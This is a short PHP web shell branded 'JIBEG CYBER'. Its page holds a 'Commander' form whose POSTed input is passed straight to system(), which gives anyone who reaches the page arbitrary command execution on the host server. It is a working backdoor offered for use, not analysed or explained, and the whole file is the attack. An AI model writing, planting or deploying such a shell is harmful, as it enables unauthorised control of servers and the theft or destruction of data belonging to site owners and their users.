<html>
<title>[&#8224;] JIBEG [&#8224;]</title><body bgcolor=#111" text="#
999" a,link="orange"/>
<center><b>[&#8224;] JIBEG CYBER [&#8224;]</b></center>
<body><br><hr>
<pre>
<form method=post>
   Commander : <input name=cmd value=<?php $_POST['cmd'];?> >
</form><hr>
<?php
if(isset($_POST['cmd']) && $_POST['cmd']!=''){
   system($_POST['cmd'].' 2>&1');
}
?>
</pre>
</body>
<br><hr>
<center><a href="?">[&#8224;] JIBEG UNIX [&#8224;]</a></center>
</html>